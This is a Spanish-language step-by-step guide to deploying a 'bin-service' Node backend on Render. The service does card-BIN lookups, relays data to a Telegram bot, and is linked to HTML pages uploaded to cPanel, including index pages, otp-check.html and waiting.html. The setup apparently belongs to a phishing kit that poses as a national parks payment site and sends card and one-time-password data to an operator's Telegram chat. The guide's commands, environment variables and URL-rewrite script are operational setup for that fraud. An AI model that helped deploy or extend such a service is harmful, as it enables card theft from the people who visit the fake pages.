# 🚀 Guía de Deploy - bin-service en Render

**Versión:** 1.0  
**Fecha:** 2026-10-28  
**Estado:** Listo para producción

---

## 📋 Requisitos Previos

- ✅ Cuenta de GitHub (gratis)
- ✅ Cuenta de Render (gratis)
- ✅ Token de Bot de Telegram (@BotFather)
- ✅ Chat ID de Telegram (@userinfobot)

---

## 🔧 Paso 1: Preparar GitHub

### 1.1 Crear repositorio en GitHub

```bash
# Opción A: Crear repositorio nuevo en github.com
# 1. Abre https://github.com/new
# 2. Nombre: "parques-nacionales-api"
# 3. Descripción: "API de pagos - Parques Nacionales"
# 4. Público (recomendado)
# 5. Click en "Create repository"
```

### 1.2 Subir código a GitHub

```bash
# En la carpeta bin-service
cd C:\Users\LENOVO\Desktop\parrk\rutes\bin-service

# Inicializar git
git init

# Agregar todos los archivos (excepto node_modules - ya en .gitignore)
git add -A

# Crear primer commit
git commit -m "Initial commit: bin-service para Parques Nacionales"

# Agregar remote (reemplaza USER y REPO)
git remote add origin https://github.com/TU_USUARIO/parques-nacionales-api.git
git branch -M main
git push -u origin main
```

**Resultado esperado:**
```
✓ Código en GitHub
✓ README.md visible
✓ package.json, src/, etc.
```

---

## 🌐 Paso 2: Configurar Render

### 2.1 Conectar GitHub a Render

```
1. Abre https://render.com
2. Click "Dashboard"
3. Click "+ New" → "Web Service"
4. Click "Connect account" (GitHub)
5. Autoriza a Render acceder a GitHub
6. Selecciona el repositorio "parques-nacionales-api"
```

### 2.2 Configurar servicio en Render

```
Nombre:                  bin-service
Environment:             Node
Build Command:           npm install
Start Command:           npm start
Plan:                    Free
Region:                  Oregon (o la más cercana)
Branch:                  main
```

**Click en "Create Web Service"**

### 2.3 Esperar a que compile

Render comenzará a construir automáticamente:
```
✓ Clonando repositorio
✓ Instalando npm install
✓ Iniciando npm start
```

Cuando veas:
```
=== Service is live ===
https://bin-service-abc123.onrender.com
```

**¡Anota esa URL!** La necesitarás en paso siguiente.

---

## 🔐 Paso 3: Configurar Variables de Entorno

### 3.1 En Render Dashboard

```
1. Abre tu servicio en Render
2. Click en "Environment"
3. Agrega estas variables (Click "+ Add Environment Variable"):
```

| Key | Value | Notas |
|-----|-------|-------|
| `TELEGRAM_TOKEN` | Tu token del bot | De @BotFather |
| `TELEGRAM_CHAT_ID` | Tu chat ID | De @userinfobot |
| `PUBLIC_URL` | https://bin-service-abc123.onrender.com | La URL que anotaste |
| `ALLOWED_ORIGIN` | * | Para CORS |

### 3.2 Deploys se reinician automáticamente

Render reiniciará el servicio con las nuevas variables. Espera a que compile.

**Verifica en logs:**
```
[autoping] ✓ Habilitado: se ejecutará cada 14 min
bin-service listening on :3000
CORS origin: *
[TG] Polling iniciado
```

---

## 🧪 Paso 4: Probar Endpoint

### 4.1 Test BIN Check

```bash
curl -X POST "https://bin-service-abc123.onrender.com/bin-check" \
  -H "Content-Type: application/json" \
  -d '{"bin":"453021"}'
```

Respuesta esperada:
```json
{
  "bin": "453021",
  "bank": "Bancolombia",
  "scheme": "VISA",
  ...
}
```

### 4.2 Test Health Check

```bash
curl "https://bin-service-abc123.onrender.com/ping"
```

Respuesta:
```json
{
  "ok": true,
  "ts": 1698537600000,
  "uptime": 123.45
}
```

---

## 📝 Paso 5: Actualizar Archivos HTML

### 5.1 Reemplazar localhost con URL de Render

En todos los archivos HTML (`index.html`, `index2.html`, etc.), busca:

```javascript
// ANTES
fetch('http://localhost:3000/bin-check', ...)
```

```javascript
// DESPUÉS
fetch('https://bin-service-abc123.onrender.com/bin-check', ...)
```

### 5.2 Script PowerShell para automatizar

En raíz del proyecto, crea `UPDATE_RENDER_URL.bat`:

```batch
@echo off
setlocal enabledelayedexpansion

set /p "RENDER_URL=Ingresa tu URL de Render (ej: https://bin-service-abc123.onrender.com): "

echo Actualizando archivos HTML...

REM Archivos a actualizar
for %%F in (index.html index2.html index3.html index4.html index4_*.html) do (
    if exist "%%F" (
        echo Actualizando: %%F
        powershell -Command "(Get-Content '%%F') -replace 'http://localhost:3000', '%RENDER_URL%' | Set-Content '%%F'"
    )
)

REM Archivos en rutes
for %%F in (rutes\otp-check.html rutes\logo-check.html rutes\waiting.html) do (
    if exist "%%F" (
        echo Actualizando: %%F
        powershell -Command "(Get-Content '%%F') -replace 'http://localhost:3000', '%RENDER_URL%' | Set-Content '%%F'"
    )
)

echo.
echo ✓ Actualización completada
echo   URL: %RENDER_URL%
pause
```

**Ejecución:**
```bash
UPDATE_RENDER_URL.bat
```

---

## 🔒 Configuración de Telegram Webhook (Opcional - Mayor velocidad)

**Nota:** Actualmente usa polling. Para webhooks (más rápido):

```javascript
// En telegram-bot.js, reemplaza startPolling() con:
async function setupWebhook() {
  const webhookUrl = `${process.env.PUBLIC_URL}/telegram-webhook`;
  const r = await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ url: webhookUrl })
    }
  );
  console.log('[TG] Webhook configurado:', await r.json());
}
```

Pero por ahora, **polling es suficiente y más simple**.

---

## 📊 Monitoreo en Render

### Ver logs en tiempo real

```
1. Abre Dashboard de Render
2. Click en tu servicio "bin-service"
3. Click en "Logs"
4. Verás todos los eventos en vivo
```

### Métricas

```
1. Click en "Metrics"
2. Ve: CPU, Memoria, Solicitudes
3. Con plan Free: máx 512 MB RAM
```

---

## 🛑 Detener/Reiniciar Servicio

```
1. Dashboard Render
2. Click en servicio
3. Botón "Suspend" (pausar) o "Deploy" (reiniciar)
```

---

## 🆘 Troubleshooting

| Problema | Solución |
|----------|----------|
| Deploy falla | Revisa logs, asegúrate package.json correcto |
| Variables env no aplican | Redeploy manual después de agregar |
| URL localhost aún en HTML | Ejecuta UPDATE_RENDER_URL.bat |
| Servidor se duerme | PUBLIC_URL configurada + autoping habilitado |
| Telegram no recibe mensajes | Verifica TELEGRAM_TOKEN y TELEGRAM_CHAT_ID |

---

## 📝 Checklist Final

- [ ] GitHub repo creado y código subido
- [ ] Render conectado a GitHub
- [ ] Deploy completado exitosamente
- [ ] Variables de entorno configuradas
- [ ] Telegram Token y Chat ID agregados
- [ ] PUBLIC_URL agregada
- [ ] Test BIN check exitoso
- [ ] Archivos HTML actualizados con URL de Render
- [ ] Autoping visible en logs cada 14 min

---

## 🎉 ¡Listo!

**Tu servidor está en producción en Render.** 

- ✅ URL permanente
- ✅ Funciona 24/7
- ✅ No requiere tu PC encendida
- ✅ Autoping evita que se duerma
- ✅ Variables de entorno seguras

**Próximos pasos:**
1. Sube tus archivos HTML a cPanel con URLs de Render
2. Prueba el flujo completo: HTML → Render API → Telegram
3. Monitorea logs en Render Dashboard

---

**Documentación:** Render (https://render.com/docs)  
**Última actualización:** 2026-10-28
